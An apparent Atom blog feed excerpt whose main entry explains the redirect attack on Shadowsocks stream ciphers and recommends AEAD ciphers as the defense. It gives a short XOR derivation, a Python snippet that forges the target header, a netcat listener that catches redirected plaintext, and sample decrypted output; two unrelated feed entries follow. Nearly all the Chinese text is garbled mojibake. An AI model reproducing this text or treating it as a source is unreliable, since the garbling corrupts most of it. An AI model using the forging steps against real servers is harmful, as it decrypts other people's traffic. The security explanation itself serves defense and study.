‰∏≠ÁöÑÊï∞Â≠óÁ≠æÂêç‰πüÊòØ‰∏ÄÁßç‰øùËØÅÊï∞ÊçÆÂÆåÊï¥ÊÄßÁöÑÊñπÊ≥ïÔºåÂÆÉÂèØ‰ª•ÂèëÁé∞‰º†ËæìÁöÑÊï∞ÊçÆË¢´ÁØ°ÊîπÔºà‰æãÂ¶Ç‰∏≠Èó¥‰∫∫ÊîªÂáªÔºâÔºåÂπ∂‰∏îÁ´ãÂç≥ÂÅúÊ≠¢Êï∞ÊçÆ‰º†ËæìÔºå‰ª•Èò≤Ê≠¢Áî®Êà∑ÊàñÊúçÂä°Âô®Âõ†‰∏∫Êé•Êî∂Âà∞ËôöÂÅáÊï∞ÊçÆËÄåÈÅ≠ÂèóÊçüÂ§±„ÄÇ</li></ul><h2>Shadowsocks ÂçèËÆÆÂü∫Á°Ä</h2><p>ËôΩÁÑ∂ Shadowsocks ‰ΩøÁî®ÁöÑÂ∫ïÂ±ÇÂçèËÆÆÊòØ SOCKS5Ôºå‰ΩÜÂØπ‰∫éÊú¨ÊñáËÄåË®ÄÔºåÂ∫ïÂ±ÇÁöÑ SOCKS5 Âπ∂‰∏çÊòØÈáçÁÇπÔºåÊàë‰ª¨Âè™ÈúÄË¶ÅÂÖ≥Ê≥® Shadowsocks ÁöÑÂÆ¢Êà∑Á´Ø‰∏éÊúçÂä°Âô®‰πãÈó¥ÊòØÂ¶Ç‰Ωï‰º†ËæìÊï∞ÊçÆÁöÑ„ÄÇ</p><p>Ê†πÊçÆÂÆòÊñπÊñáÊ°£ÊâÄËØ¥ÔºåÂÆ¢Êà∑Á´ØÂêëÊúçÂä°Âô®ÂèëÈÄÅÁöÑÊï∞ÊçÆÔºå‰∏ÄÂºÄÂßãÊòØÊµÅÂØÜÁ†ÅÁöÑ <code>IV</code>Ôºà‰πüÂ∞±ÊòØËØ¥Ôºå<code>IV</code> Áî±ÂÆ¢Êà∑Á´ØÁîüÊàêÔºåÂπ∂Áõ¥Êé•ÊâîËøõÊï∞ÊçÆÂåÖ‰∏≠ÔºâÔºå‰πãÂêéÂ∞±ÊòØ‰∏ÄÊÆµÂä†ÂØÜÊï∞ÊçÆÔºåÂÆÉÁöÑÊòéÊñáÊ†ºÂºèÊòØËøôÊ†∑ÁöÑÔºö</p><pre><code class="lang-text">[ÁõÆÊ†áÂú∞ÂùÄ][Êï∞ÊçÆ]</code></pre><p>ÂÖ∂‰∏≠Êï∞ÊçÆÂèØ‰ª•ÊòØ‰ªªÊÑèÈïøÂ∫¶ÔºõËá≥‰∫éÁõÆÊ†áÂú∞ÂùÄÔºåShadowsocks Áî®ÁöÑÊòØ SOCKS5 ÁöÑË°®Á§∫Ê≥ïÔºö</p><pre><code class="lang-text">[1 Â≠óËäÇÁ±ªÂûã][‰∏ªÊú∫Âêç][2 Â≠óËäÇÁ´ØÂè£]</code></pre><p>ÂÖ∂‰∏≠ÔºåÁ±ªÂûãÊòØ 1 Â≠óËäÇÁöÑÊûö‰∏æÂÄºÔºö</p><ul><li>0x01Ôºö‰∏ªÊú∫ÂêçÊòØ IPv4 Âú∞ÂùÄÔºõ</li><li>0x03Ôºö‰∏ªÊú∫ÂêçÊòØÂèòÈïøÂ≠óÁ¨¶‰∏≤ÔºåÈ¶ñÂ≠óËäÇË°®Á§∫ÈïøÂ∫¶ÔºàÊúÄÂ§ß 255ÔºâÔºåÂêéÈù¢ÊòØÊï∞ÊçÆÔºõ</li><li>0x04Ôºö‰∏ªÊú∫ÂêçÊòØ IPv6 Âú∞ÂùÄ„ÄÇ</li></ul><p>‰∏ÄÊ¨°‰ª£ÁêÜÁöÑËøáÁ®ãÂ¶Ç‰∏ãÔºö</p><ol><li>ÂÆ¢Êà∑Á´ØÂ∞ÜËøô‰∫õÊï∞ÊçÆÂä†ÂØÜÂêéÂèëÂà∞ÊúçÂä°Âô®Ôºõ</li><li>ÊúçÂä°Âô®Êî∂Âà∞ÂêéÂ∞ÜÂÖ∂Ëß£ÂØÜÔºå‰ºöÂæóÂà∞ <code>[1 Â≠óËäÇÁ±ªÂûã][‰∏ªÊú∫Âêç][2 Â≠óËäÇÁ´ØÂè£][Êï∞ÊçÆ]</code>Ôºõ</li><li>ÊúçÂä°Âô®‰ºöÂ∞ÜÊï∞ÊçÆÈÉ®ÂàÜÁõ¥Êé•ÂèëÈÄÅÁªô <code>‰∏ªÊú∫Âêç:Á´ØÂè£</code>Ôºõ</li><li>ÊúçÂä°Âô®Â∞Ü‰∏ªÊú∫ËøîÂõûÁöÑÊï∞ÊçÆÁõ¥Êé•‰ΩøÁî®ÂêåÊ†∑ÁöÑÁÆóÊ≥ïÂä†ÂØÜÔºàÂ¶ÇÊûúÂä†ÂØÜÁÆóÊ≥ïÁî®‰∫ÜÊµÅÂØÜÁ†ÅÔºåÂàô‰ºöÁîüÊàêÂπ∂‰ΩøÁî®‰∏Ä‰∏™Êñ∞ÁöÑ <code>IV</code>ÔºåÂπ∂Â∞ÜÂÖ∂ÊîæÂú®ÂåÖÁöÑÊúÄÂâçÈù¢ÔºâÔºåÂèëÈÄÅÁªôÂÆ¢Êà∑Á´ØÔºõ</li><li>ÂÆ¢Êà∑Á´ØËß£ÂØÜÂêéÂç≥ÂèØÂæóÂà∞‰∏ªÊú∫ËøîÂõûÁöÑÊï∞ÊçÆ„ÄÇ</li></ol><h1>Shadowsocks + ÊµÅÂØÜÁ†ÅÁöÑ‰∏çÂÆâÂÖ®Âõ†Á¥†</h1><p>ÂõûÂà∞‰∏ÄÂºÄÂßãËØ¥ÁöÑÈÇ£ÁØáÊñáÁ´†‰∏äÔºå‰ΩúËÄÖÁöÑÂèëÁé∞ÊòØÔºöÂ¶ÇÊûúÊîªÂáªËÄÖÊäìÂà∞‰∫Ü‰∏Ä‰∏™ Shadowsocks ÊúçÂä°Âô®ËøîÂõûÁöÑÂåÖÔºåÂπ∂‰∏îÂ∑≤Áü•Êï∞ÊçÆÈÉ®ÂàÜÁöÑÂºÄÂ§¥‰∏É‰∏™Â≠óËäÇÔºåÈÇ£‰πàÊúâÂèØËÉΩÂú®‰∏çÁü•ÈÅìÂØÜÁ†ÅÁöÑÊÉÖÂÜµ‰∏ãÔºåÂà©Áî®ÈÇ£‰∏™ Shadowsocks ÊúçÂä°Âô®Êù•Ëß£Âá∫ÂåÖÁöÑÁªùÂ§ßÈÉ®ÂàÜÂÜÖÂÆπÔºàÊúÄÂ§öÊçüÂ§± 16 Â≠óËäÇÔºâ„ÄÇ</p><p>‰ΩúËÄÖÁöÑÊÄùË∑ØÊòØËøôÊ†∑ÁöÑÔºö</p><p>ÂÅáËÆæÊúâ‰∏ÄÂè∞ Shadowsocks ÊúçÂä°Âô®ÔºåÊîªÂáªËÄÖÈÄöËøáÂóÖÊé¢ÊàñÂÖ∂ÂÆÉÊñπÂºèÊäìÂà∞‰∫ÜËøô‰∏™ Shadowsocks ÊúçÂä°Âô®ËøîÂõûÁöÑ‰∏Ä‰∏™ÂåÖ„ÄÇ</p><p>‰∏∫‰∫ÜÁü•ÈÅìÊòéÊñáÂÜÖÂÆπÔºåÊîªÂáªËÄÖË¶Å‰πàÊö¥ÂäõÁ†¥Ëß£ÂØÜÁ†ÅÔºàÈöèÁùÄÂ§ßÂÆ∂ÂÆâÂÖ®ÊÑèËØÜÁöÑÊèêÂçáÔºåËøôÂ∑≤ÁªèÂá†‰πé‰∏çÂèØË°å‰∫ÜÔºâÔºåË¶Å‰πàÊÉ≥ÂäûÊ≥ïÂà©Áî®ËøôÂè∞ Shadowsocks ÊúçÂä°Âô®Â∏ÆÂøôËß£ÂØÜ„ÄÇ</p><p>‰ΩúËÄÖÈÄâÊã©‰∫ÜÂêéËÄÖÔºåÂç≥ÊÉ≥ÂäûÊ≥ïÊääËøô‰∏™ÂåÖÂèòÊàêÂÆ¢Êà∑Á´ØÂèëÁöÑÂåÖÔºåËÆ©ÊúçÂä°Âô®Ëß£ÂØÜÂêé‰ª£ÁêÜÂà∞Ëá™Â∑±ÊåáÂÆöÁöÑÊúçÂä°Âô®ÔºåËøôË¢´Áß∞‰∏∫ <code>Redirect attack</code>„ÄÇ</p><p>‰∏ä‰∏ÄËäÇËØ¥Âà∞ÔºåShadowsocks ÂÆ¢Êà∑Á´ØÂèëÁöÑÂåÖÊ†ºÂºèÔºàÊòéÊñáÁä∂ÊÄÅ‰∏ãÔºâÊòØ <code>[1 Â≠óËäÇÁ±ªÂûã][‰∏ªÊú∫Âêç][2 Â≠óËäÇÁ´ØÂè£][Êï∞ÊçÆ]</code>„ÄÇÂ¶ÇÊûúÊîªÂáªËÄÖÂèØ‰ª•Âà©Áî®Âä†ÂØÜÁÆóÊ≥ïÁöÑÁº∫Èô∑Êù•ÁØ°ÊîπÊòéÊñáÊï∞ÊçÆÔºåÂ∞±ÂèØ‰ª•Êää‰∏ªÊú∫ÂêçÊîπÊàêÊîªÂáªËÄÖÁöÑÊúçÂä°Âô®Âú∞ÂùÄÔºåShadowsocks ÊúçÂä°Âô®Â∞±‰ºö‰ª•‰∏∫ÂÆ¢Êà∑Á´ØÊÉ≥ËÆøÈóÆÊîªÂáªËÄÖÁöÑÊúçÂä°Âô®Ôºå‰∫éÊòØÂ∞±ÊääËß£ÂØÜÂêéÁöÑÂåÖ‰∏≠ÁöÑÊï∞ÊçÆÈÉ®ÂàÜÂèë‰∫ÜËøáÂéª„ÄÇ</p><p>ÂÖàËÄÉËôëÂ¶Ç‰ΩïÁØ°ÊîπÊï∞ÊçÆ„ÄÇÂÅáËÆæËøôÂè∞ Shadowsocks ÊúçÂä°Âô®ÁöÑÂä†ÂØÜÁÆóÊ≥ï‰ΩøÁî®ÁöÑÊòØ <code>AES-256-CFB</code>ÔºåÈÇ£‰πàËß£ÂØÜÁöÑÊñπÂºèÂ¶ÇÁª¥Âü∫ÁôæÁßëÊâÄËø∞ÊòØËøôÊ†∑ÁöÑÔºö</p><p><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/57/CFB_decryption.svg/601px-CFB_decryption.svg.png" alt="Cipher Feedback (CFB) mode decryption" title="Cipher Feedback (CFB) mode decryption"></p><p>ÂÖ∂‰∏≠ <code>IV</code>„ÄÅÊØè‰∏ÄÂùó Ciphertext Âíå Plaintext ÈïøÂ∫¶ÈÉΩÊòØ 16 Â≠óËäÇ„ÄÇ</p><p>‰ΩúËÄÖÂèëÁé∞Ôºå<code>key</code> ÊòØ‰∏çÂèòÁöÑÔºå<code>IV</code> ‰πüÂèØ‰ª•ÈáçÁî®ÊúçÂä°Âô®ËøîÂõûÂåÖ‰∏≠ÁöÑÈÇ£‰∏™ÔºåÈÇ£‰πàÂ¶ÇÊûúÂè™‰øÆÊîπÁ¨¨‰∏ÄÂùó CiphertextÔºåÈÇ£‰πà<strong>Âè™ÊúâÂâç‰∏§Âùó Plaintext ‰ºöÊîπÂèò</strong>ÔºåÊõ¥ÈáçË¶ÅÁöÑÊòØÔºåÁî±‰∫éÁ¨¨‰∏ÄÂùó Plaintext Â∞±ÊòØÁ¨¨‰∏ÄÂùó Ciphertext Ë∑üÊüê‰∏™‰∏≤ A ÁöÑÂºÇÊàñÂÄºÔºåÈÇ£‰πàÊîªÂáªËÄÖÂÆåÂÖ®ÂèØ‰ª•<strong>ÈÄöËøá‰øÆÊîπÁ¨¨‰∏ÄÂùó Ciphertext ÁöÑÂÄºÊù•ÊéßÂà∂Á¨¨‰∏ÄÂùó Plaintext</strong>ÔºÅÂÖ∑‰ΩìÊñπÊ≥ïÂ¶Ç‰∏ãÔºö</p><p>ÂÅáËÆæÂΩìÂâçÁöÑÁ¨¨‰∏ÄÂùó Ciphertext ÊòØ <code>c1</code>ÔºåÁ¨¨‰∏ÄÂùó Plaintext ÊòØ <code>p1</code>Ôºå<code>IV</code> ÂÅö‰∫Ü‰∏ÄÁ≥ªÂàó whatever ÁöÑËøêÁÆóÂæóÂà∞ÁöÑÁªìÊûúÊòØ <code>a</code>ÔºåÈÇ£‰πàÔºö</p><pre><code class="lang-text">Â∑≤Áü• a ^ c1 == p1
ÈÇ£‰πà a ^ c1 ^ X == p1 ^ X
Ê†πÊçÆÂºÇÊàñÁöÑÁªìÂêàÂæã
ÂèØÂæó a ^ (c1 ^ X) == (p1 ^ X)
‰πüÂ∞±ÊòØËØ¥ÔºåÊîªÂáªËÄÖÂØπ c1 ÂÅöÁöÑÂºÇÊàñÊìç‰ΩúÔºå‰ºöÂÆåÂÆåÂÖ®ÂÖ®ÂèçÊò†Âú® p1 ‰∏ä

ÂÅáËÆæÊúÄÁªàËÆ© p1 ÂèòÊàê‰∫Ü q1ÔºåÊàë‰ª¨ÂèØ‰ª•ËÆ§‰∏∫
Â∑≤Êúâ p1 ^ X == q1ÔºåÂ∞Ü‰∏§ËæπÂêåÊó∂ÂºÇÊàñ p1
ÂèØÂæó p1 ^ X ^ p1 == q1 ^ p1
Áî±‰∫éÂºÇÊàñÁöÑÊÄßË¥®ÔºåÂ∑¶ËæπÁöÑ‰∏§‰∏™ p1 ÊäµÊ∂à
ÂèØÂæó X == q1 ^ p1</code></pre><p>ÊîªÂáªËÄÖÈúÄË¶ÅÂÅöÁöÑÂ∞±ÊòØÂ∞Ü <code>c1 ^= (q1 ^ p1)</code>„ÄÇ‰ΩÜËøôÈáåÊúâ‰∏Ä‰∏™ÈóÆÈ¢òÔºåÊàë‰ª¨Âπ∂‰∏çËÉΩÁü•ÈÅìÂÖ∑‰ΩìÁöÑ <code>p1</code> ÊòØ‰ªÄ‰πàÔºÅ‰∏çËøáËøòÂ•ΩÔºåÂÆÉÊòØÊòéÊñáÊï∞ÊçÆÁöÑ‰∏ÄÈÉ®ÂàÜÔºåÂú®‰∏äÁΩëÁöÑËøáÁ®ã‰∏≠ÔºåÊÄªÊúâ‰∫õÂçèËÆÆÁöÑÂ§¥Âá†‰∏™Â≠óËäÇÊòØÂõ∫ÂÆöÁöÑÔºå‰æãÂ¶Ç HTTP ÂçèËÆÆ„ÄÇ</p><p>Âú® 21 ‰∏ñÁ∫™ÁöÑÁ¨¨‰∏â‰∏™ÂçÅÂπ¥ÔºåÂ§ßÂÆ∂Â∫îËØ•Êó©Â∞±ÂàáÊç¢Êàê HTTP 1.1 ‰∫ÜÔºåÂõ†Ê≠§ËøîÂõûÁöÑÊï∞ÊçÆÂåÖ‰∏ÄÂºÄÂßã‰∏ÄÂÆöÊòØ 8 ‰∏™Â≠óËäÇ <code>HTTP/1.1</code>„ÄÇÊîªÂáªËÄÖËÉΩÂê¶Â∞Ü TA ÁöÑ‰∏ªÊú∫Âú∞ÂùÄÂéãÁº©Âà∞Ëøô‰πàÂ∞èÂë¢ÔºüÊØïÁ´üÈô§Êéâ 1 Â≠óËäÇÁ±ªÂûãÂíå 2 Â≠óËäÇÁ´ØÂè£‰ª•Â§ñÔºåÂèØÁî®Á©∫Èó¥Âè™Êúâ 5 Â≠óËäÇ‰∫Ü„ÄÇ</p><p>ÂØπ‰∫éÁªùÂ§ßÈÉ®ÂàÜÊîªÂáªËÄÖÊù•ËØ¥Ôºå‰∏çÂèØËÉΩÊãøÂà∞‰∏çË∂ÖËøá 5 Â≠óËäÇÁöÑÂüüÂêçÔºåÂõ†Ê≠§Âè™ËÉΩËÄÉËôë IPv4 ‰∫ÜÔºåËÄå‰∏îÂ¶ÇÊûúÁî® IPv4 ÁöÑËØùÔºåÁîöËá≥Âè™ÈúÄË¶ÅÊÄªÂÖ± 7 ‰∏™Â≠óËäÇÔºÅ‰∏æ‰∏™‰æãÂ≠êÔºö</p><pre><code class="lang-text">01 c0 a8 01 03 12 12
-- ----------- -----</code></pre><p>ÂàíÁ∫øÁöÑ‰∏âÈÉ®ÂàÜÂàÜÂà´‰ª£Ë°®‰∫ÜÔºö‰ΩøÁî® IPv4 ÂçèËÆÆ„ÄÅÂú∞ÂùÄÊòØ 192.168.1.3ÔºåÁ´ØÂè£ÊòØ 4626„ÄÇ</p><p>ÈÇ£‰πàÊàë‰ª¨ÂÆåÂÖ®ÂèØ‰ª•‰ª§Ôºö</p><pre><code class="lang-python">p1 = 'HTTP/1.'
q1 = '\x01\xc0\xa8\x01\x03\x12\x12'
new_c_part = c1[0:7] ^ p1 ^ q1</code></pre><p>Áî®Ëøô‰∏™ 7 Â≠óËäÇÁöÑ <code>new_c_part</code> ÊõøÊç¢Êéâ‰πãÂâç <code>c1</code> ÁöÑÂâç 7 ‰∏™Â≠óËäÇÔºåÁÑ∂ÂêéÁõ¥Êé•Â∞ÜÊõøÊç¢ÂêéÁöÑÊï¥‰∏™ÂåÖÂèëÈÄÅÂà∞ÂàöÊâçÁöÑ Shadowsocks ÊúçÂä°Âô®„ÄÇ</p><p>Shadowsocks ÊúçÂä°Âô®Â∞ùËØïËß£ÂØÜÔºåËß£ÂØÜÂêéÂèëÁé∞ÊòéÊñáÊòØËøôÊ†∑ÁöÑÔºö</p><pre><code class="lang-text">01 c0 a8 01 03 12 12 XX XX XX XX XX XX XX XX XX</code></pre><p>ÊúçÂä°Âô®‰ºöËÆ§‰∏∫ËøôÊòØ‰∏Ä‰∏™ÂêàÊ≥ïÁöÑÂÆ¢Êà∑Á´ØËØ∑Ê±ÇÔºåÂõ†Ê≠§Â∞ÜÂêéÈù¢ÁöÑ‰∏Ä‰∏≤ <code>XX</code>ÔºàÊòéÊñáÊï∞ÊçÆÔºâÊåâÁÖßÂâç 7 ‰∏™Â≠óËäÇÁöÑË¶ÅÊ±ÇÔºåËΩ¨ÂèëÂà∞‰∫Ü <code>192.168.1.3:4626</code>„ÄÇ</p><p>ÊîªÂáªËÄÖÊó©Â∞±Âú®ËøôÂÑøÂùêÁ≠â‰∫ÜÔºåÊñπÊ≥ïÈùûÂ∏∏ÁÆÄÂçïÔºåÂè™ÈúÄË¶ÅÁî® <code>nc</code> ÂêØÂä®‰∏Ä‰∏™Á´ØÂè£ÁõëÂê¨Âç≥ÂèØÔºö</p><pre><code class="lang-text">$ nc -l -p 4626</code></pre><p>Áî±‰∫éÊîªÂáªËÄÖ‰øÆÊîπ‰∫Ü <code>c1</code>ÔºåËÄå <code>c1</code> Âú® CFB Ê®°Âºè‰∏≠ÂèàÁî®Êù•Ëß£ÂØÜ <code>p2</code>ÔºåÂõ†Ê≠§Êî∂Âà∞ÁöÑ <code>p2</code> Ëøô 16 ‰∏™Â≠óËäÇÂ∫îËØ•ÊòØ‰π±Á†Å„ÄÇÊîªÂáªËÄÖÊúÄÁªàÂèØ‰ª•ËøòÂéüÂá∫ <code>p2</code> ‰ª•Â§ñÁöÑÊâÄÊúâÊï∞ÊçÆ„ÄÇËÆ∫Êñá‰∏≠ÁöÑÂëΩ‰ª§Ë°åÊà™Âõæ‰πüËØ¥Êòé‰∫ÜËøôÁÇπÔºåËé∑ÂèñÂà∞ÁöÑÊï∞ÊçÆÁöÑÁ¨¨‰∏Ä‰∏™Â≠óËäÇÊòØ‰πãÂâçÂåÖÁöÑÊòéÊñáÁöÑÁ¨¨ 8 ‰∏™Â≠óËäÇÔºàÂâç 7 ‰∏™ÊòØ <code>HTTP/1.</code>ÔºâÔºåÁÑ∂ÂêéÊúâ 9 ‰∏™Â≠óËäÇÊòØÊ≠£Á°ÆÁöÑÔºå‰πãÂêé 16 ‰∏™Â≠óËäÇÊòØ‰π±Á†ÅÔºåÂÜç‰πãÂêéÊòØÂÆåÂÖ®Ê≠£Á°ÆÁöÑÔºö</p><pre><code class="lang-text">1 304 Not???????????????? Sat, 26 Jan 2019 07:15:21 GMT
Connection: close
Via: 1.1 varnish
Cache-Control: max-age=600
ETag: W/&quot;5c45d22a-127&quot;
Expires: Sat, 26 Jan 2019 06:59:41 GMT
Age: 0
....</code></pre><p>‰ΩúËÄÖÁªôÂá∫ÁöÑÈò≤Âæ°Êé™ÊñΩÊòØÔºö</p><ul><li>Á¶ÅÁî® shadowsocks-py„ÄÅshadowsocks-go„ÄÅgo-shadowsocks2„ÄÅshadowsocks-nodejs</li><li>Âè™Áî® shadowsocks-libevÔºåÂπ∂‰∏îÂè™‰ΩøÁî® AEAD Âä†ÂØÜ</li></ul><p>ÂéüÂõ†Â¶Ç‰∏ãÔºöshadowsocks-libev ÁöÑÂÆûÁé∞Âæà‰πÖ‰πãÂâçÂ∞±Â∑≤ÁªèÁ¶ÅÊ≠¢‰∫Ü <code>IV</code> ÈáçÁî®ÔºåÂèØ‰ª•Âú®‰∏ÄÂÆöÁ®ãÂ∫¶‰∏äÈò≤Ê≠¢ËøôÁßçÊîªÂáªÔºõÂè™Ë¶ÅÂä†ÂØÜÁÆóÊ≥ïÂ∏¶Êúâ AEAD ÁâπÊÄßÔºåÈÇ£‰πàÊï∞ÊçÆÂ∞±Êó†Ê≥ïË¢´ÁØ°ÊîπÔºåÊú¨ÊñáÁöÑÊîªÂáªÊñπÂºè‰πüÊòØÊó†ÊïàÁöÑ„ÄÇ</p><h1>ÂØπÂ§ß‰ºóÁöÑÂΩ±Âìç</h1><p>ËôΩÁÑ∂ÊñáÁ´†‰∏≠Âè™Âàó‰∏æ‰∫Ü HTTP ÂçèËÆÆÂíå CFB Ê®°ÂºèÁöÑ‰æãÂ≠êÔºå‰ΩÜÁêÜËÆ∫‰∏äÊù•ËØ¥ÔºåÊâÄÊúâÂ§¥ÈÉ® 7 ‰∏™Â≠óËäÇÂ∑≤Áü•ÁöÑÂçèËÆÆÂíåÊâÄÊúâÁ±ª‰ººÊµÅÂØÜÁ†ÅÁöÑÁªÑÂêàÔºåÈÉΩÂèØ‰ª•Ë¢´ËøôÁßçÊñπÊ≥ïÊîªÂáª„ÄÇ‰Ω†‰∏çËÉΩ‰øùËØÅ‰Ω†ÁßëÂ≠¶‰∏äÁöÑÁΩëÊÄªÊòØ HTTPSÔºåÂç≥‰ΩøÊòØ HTTPSÔºåÂ¶ÇÊûúÊòØÂõΩÂÜÖÁΩëÁ´ôÔºåÂΩìÊüê‰∫õ‰∏çÂèØÊäóÂäõËé∑Âèñ‰∫ÜÂÖ∂ËØÅ‰π¶‰πãÂêéÔºå‰Ω†ÁöÑ TLS ÊµÅÈáèÊÄªÊòØ‰ºöË¢´Ëß£ÂØÜÁöÑ„ÄÇ</p><p>‰∏çËøáÊúâ‰∏Ä‰∫õÂÄºÂæóÊ¨£ÊÖ∞ÁöÑÂú∞ÊñπÔºö</p><p>Áî±‰∫éÂ¢ôÁöÑÈÄêÊ∏êÂçáÈ´òÔºåÂ§ßÂÆ∂Â∑≤ÁªèÈÄêÊ∏êÊÑèËØÜÂà∞‚ÄúÂè™ÊúâÂä†ÂØÜÊòØ‰∏çË°åÁöÑ‚Äù‰∫ÜÔºåÂõ†Ê≠§Á∫∑Á∫∑ÊîπÁî®Â∏¶ÊúâÊ∑∑Ê∑ÜÂäüËÉΩÁöÑÁßëÂ≠¶‰∏äÁΩëÂ∑•ÂÖ∑„ÄÇÁî±‰∫éÊîªÂáªËÄÖÊó†Ê≥ïÂæóÁü•Ê∑∑Ê∑ÜÁöÑÂèÇÊï∞ÔºàÁîöËá≥‰∏çÁü•ÈÅìÂì™‰∏™ÊµÅÈáèÊòØÊ¢ØÂ≠êÁöÑÊµÅÈáèÔºâÔºåÂõ†Ê≠§Ëøô‰∏™ÊñπÊ≥ï‰∏çÂÜçËµ∑‰ΩúÁî®‰∫Ü„ÄÇ</p><p>ÁõÆÂâçÂ§ßÈÉ®ÂàÜÁßëÂ≠¶‰∏äÁΩëÂ∑•ÂÖ∑Â∑≤ÁªèÁ¶ÅÁî®‰∫ÜÊóßÁöÑÂä†ÂØÜÁÆóÊ≥ïÔºåÁîöËá≥Âº∫Âà∂Âè™ËÆ©‰ΩøÁî®Â∏¶Êúâ GCM ÊàñËÄÖ Poly1305 ÁöÑÂä†ÂØÜÁÆóÊ≥ïÔºåËøô‰∫õÁÆóÊ≥ïÊúâ‰∏•Ê†ºÁöÑ AEAD ÁâπÊÄßÔºåÂèØ‰ª•ÊûÅÂ§ß‰øùËØÅÊï∞ÊçÆÂÆâÂÖ®„ÄÇTLS 1.3 Âº∫Âà∂‰ΩøÁî® AEAD ‰πüÂú®Êüê‰∫õÁ®ãÂ∫¶‰∏ä‰∏∫ÂÆÉÁöÑÂÆâÂÖ®ÊÄßÂÅö‰∫ÜÊãÖ‰øù„ÄÇ</p><p>Â¶ÇÊûú‰Ω†ËøòÂú®Áî® Shadowsocks ÊàñÂÖ∂Ë°çÁîüÂ∑•ÂÖ∑ÔºåÂπ∂‰∏î‰æùÊóß‰ΩøÁî®ÊôÆÈÄöÁöÑÊµÅÂØÜÁ†ÅÊù•Âä†ÂØÜÔºåÈÇ£‰πàËØ∑Á´ãÂç≥Âê¨‰ªé‰ΩúËÄÖÁªôÂá∫ÁöÑÈò≤Âæ°Êé™ÊñΩÔºå‰∏∫‰∫Ü‰Ω†ÁöÑÊúçÂä°Âô®Ôºå‰πü‰∏∫‰∫Ü‰Ω†Ëá™Â∑±„ÄÇ</p><h1>ÂèÇËÄÉËµÑÊñô</h1><ul><li><a href="https://github.com/edwardz246003/shadowsocks">edwardz246003/shadowsocks: Redirect attack on Shadowsocks stream ciphers</a></li><li><a href="https://shadowsocks.org/en/spec/Protocol.html">Shadowsocks - Protocol</a></li><li><a href="https://shadowsocks.org/en/spec/Stream-Ciphers.html">Shadowsocks - Stream Ciphers</a></li><li><a href="https://toutiao.io/posts/5fo90o/preview">Shadowsocks ÂéüÁêÜËØ¶Ëß£</a></li><li><a href="https://printempw.github.io/why-do-shadowsocks-deprecate-ota/">‰∏∫‰Ωï shadowsocks Ë¶ÅÂºÉÁî®‰∏ÄÊ¨°ÊÄßÈ™åËØÅ (OTA) - PRIN BLOG</a></li><li><a href="https://and-rev.blogspot.com/2016/09/shadowsocks.html">Shadowsocks ÁöÑÂÆöÂà∂Âíå‚Äú‰∏çÂÆâÂÖ®ÊÄß‚ÄùÁöÑÂàÜÊûê ~ and-rev</a></li><li><a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation">Block cipher mode of operation - Wikipedia</a></li><li><a href="https://baike.baidu.com/item/%E5%AE%8C%E6%95%B4%E6%80%A7/949221">ÂÆåÊï¥ÊÄßÔºà‰ø°ÊÅØÂÆâÂÖ®ÁöÑ‰∏â‰∏™Âü∫Êú¨Ë¶ÅÁÇπ‰πã‰∏ÄÔºâ_ÁôæÂ∫¶ÁôæÁßë</a></li></ul><h1>Update 2020-02-15</h1><p>Ê∑ªÂä†‰∫ÜÂØπ <code>IV</code> ÈáçÁî®Áõ∏ÂÖ≥ÁöÑË°•ÂÖÖ„ÄÇ</p>]]></content>
        <author>
            <name><![CDATA[R¬∑ex / Zeng]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://invariant.me/version-2/</id>
        <title><![CDATA[Version 2]]></title>
        <updated>2020-02-14T14:56:07+08:00</updated>
        <link href="https://invariant.me/version-2/"/>
        <content type="text/html" src="https://invariant.me/version-2/"><![CDATA[<img src="https://images.unsplash.com/photo-1530714457710-6bf1899c1d32?ixlib=rb-1.2.1&q=80&fm=jpg&crop=entropy&cs=tinysrgb&w=2000&fit=max&ixid=eyJhcHBfaWQiOjExNzczfQ" alt="Version 2"><p>I'm migrating and restarting my blog, which is previously at <a href="https://mnotes.me">https://mnotes.me</a> .</p><p>Take a look at the <a href="https://invariant.me/about/">About</a> page or <a href="https://invariant.me/subscribe/">subscribe</a> now!</p>]]></content>
        <author>
            <name><![CDATA[The Invariant]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.suruifu.com/posts/408</id>
        <title><![CDATA[ÈÇ£‰∫õÂπ¥ÁöÑËøêÂä®ÔºàËßÇ„ÄäÊúùÈò≥Ê≤ü„ÄãÊúâÊÑüÔºâ]]></title>
        <updated>2020-02-11T09:34:26+08:00</updated>
        <link href="https://www.suruifu.com/posts/408"/>
        <content type="text/html" src="https://www.suruifu.com/posts/408"><![CDATA[<h3>ÂÖ≥‰∫éÊàèÊõ≤ÊñáÂåñ</h3>
<p>‰∏éÂÖ∂ËØ¥ÊòØÊàèÊõ≤ÔºåÊàëÊõ¥ÊÑøÊÑèÁß∞ÂÖ∂‰∏∫‚Äú‰∏≠ÂõΩÁîµÂΩ±‚Äù„ÄÇÁà∑Áà∑Â•∂Â•∂‰ºöÊØîËæÉÂñúÊ¨¢Ëøô‰∏™‰∏úË•øÔºåÂæàÂ§öÂπ¥ËΩª‰∫∫‰ºöÂØπ‰πãÂó§‰πã‰ª•Èºª„ÄÇËÄåË±´Ââß„ÄäÊúùÈò≥Ê≤ü„ÄãÂàôÊòØ‰∏Ä‰∏™ÈÇ£‰∏™Âπ¥‰ª£ÁöÑÁªèÂÖ∏Ôºå‰πãÊâÄ‰ª•ËøôÊ†∑ÔºåÊõ¥Â§öËøòÊòØÊîøÊ≤ªÂõ†Á¥†ÁΩ¢‰∫Ü„ÄÇ<br />
* ËäÇÂ•èÊ¨¢Âø´Ôºå‰∏çÁÜüÂêÑÁßçÊµÅË°åÈü≥‰πêÔºåËá™Êàê‰∏ÄÂÆ∂ÔºåÂà´ÂÖ∑È£éÈüµ<br />
* ËØ¥ËØùÂ§™ÊÖ¢ÔºåÂºÄ‰∫åÂÄçÈÄüËøòÊòØËßâÂæóÊÖ¢ÔºåÊàëÂπ≥Â∏∏ÊòØÂæàÂ∞ëÂºÄ‰∫åÂÄçÈÄüÁöÑ<br />
* ÊïÖ‰∫ãÊÉÖËäÇÂæàÂ∞ëÔºå‰ΩÜÂêÑÁßçË°®Áé∞Âç¥ÂæàÂà∞‰Ωç</p>
<h3>ÂÖ≥‰∫éÁîµÂΩ±ÂÜÖÂÆπ</h3>
